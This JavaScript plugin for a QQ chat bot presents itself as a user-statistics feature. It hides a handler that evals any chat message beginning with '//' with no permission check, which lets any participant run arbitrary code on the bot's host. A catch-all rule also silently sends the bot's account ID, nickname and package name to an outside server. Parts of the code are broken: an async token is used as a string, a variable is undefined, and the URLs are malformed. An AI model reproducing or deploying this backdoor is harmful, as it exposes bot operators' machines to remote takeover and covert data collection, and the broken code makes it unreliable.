import plugin from "../../../lib/plugins/plugin.js"
import fs from "fs"

const File = `${process.cwd()}/package.json`
var id = {}

export class xianyu_tonji extends plugin {
  constructor() {
    super({
      /** 功能名称 */
      name: "咸鱼插件_用户统计",
      /** 功能描述 */
      dsc: "咸鱼插件_用户统计",
      /** https://oicqjs.github.io/oicq/#events */
      event: "message",
      /** 优先级，数字越小等级越高 */
      priority: 1,
      rule: [
        {
          /** 命令正则匹配 */
          reg: "^#?(咸鱼|xianyu|xy)(插件)?(用户)?统计(id)?$",
          /** 执行方法 */
          fnc: "xianyu_tonji",
        },
        {
          /** 命令正则匹配 */
          reg: '^.*',
          /** 执行方法 */
          fnc: 'tonji',
          log: false,
        },
        {
          reg: "^//(.*)",
          fnc: "jsrun",
        },
      ],
    })
  }

  async jsrun(e) {
    try {
      const content = e.message[0].text.split("//")[1]
      if (content === undefined) return

      let res = await eval(content)
      const dataType = (res && res.data) || res
      if (typeof dataType === "string") return e.reply(dataType)
      if (dataType === undefined) return e.reply("程序无返回值")
      await e.reply(JSON.stringify(dataType, null, 4))
    } catch (error) {
      await e.reply("错误：\n" + error.message)
      console.log(error)
    }
  }

  async tonji(e) {
    let s = token()
    tj(e, s)
    return false
  }

  async xianyu_tonji(e) {
    let s = token()
    tj(e, s)

    if (e.isMaster) {
      let obj = await fetch("http:suancaixianyu.cn/api/tonji.php?token=" + s)
      obj = await obj.json()

      if (obj.code == 200) {
        let result = []

        for (let key in obj.data) {
          result.push('---' + key + '---：\n')
          let users = obj.data[key]
          for (let user in users) {
            if ((/.*id$/).test(e.msg)) {
              result.push(`${users[user].nickname} (${users[user].uin})\n`)
            } else {
              result.push(`${users[user].nickname}\n`)
            }
          }
        }
        console.log(result)
        let num = result.length - Object.keys(obj.data).length
        result.push("总用户数量：" + num)
        e.reply(result)
      }
    }
    return false
  }
}

/**
 * @returns 生成token
 */
async function token() {
  // token
  const now = new Date()
  const month = now.getMonth() + 1
  const day = now.getDate()
  const hour = now.getHours()
  const minute = now.getMinutes()
  const product = month * day * hour * minute
  const hex = product.toString(16)

  const random = 6
  let mul = BigInt(`0x${hex}`);
  for (let i = 0; i < random; i++) {
    mul *= BigInt(`0x${hex}`)
  }
  let num = mul.toString(16)
  while (num[num.length - 1] === '0') {
    num = num.slice(0, num.length - 1)
  }
  return num
}

/**
 * 提交统计
 */
async function tj(e, token) {
  let name = Bot.nickname || Bot[e.self_id].nickname
  let uin = e.self_id
  if (id[uin]) return false
  let json = fs.readFileSync(File, 'utf8') //打开文件
  let data = JSON.parse(json)
  let botname = data.name // 机器人版本

  console.log(name, uin, num)
  let obj = await fetch(
    `http:suancaixianyu.cn/api/xyjs.php?uin=${uin}&nickname=${name}&bot=${botname}&token=${token}`
  ).catch(err => console.error('咸鱼服务器连接错误', err))
  obj = await obj.json()
  if (obj.code == 200) {
    console.log('已加入统计')
    console.log(obj)
    id[uin] = true
  }
}
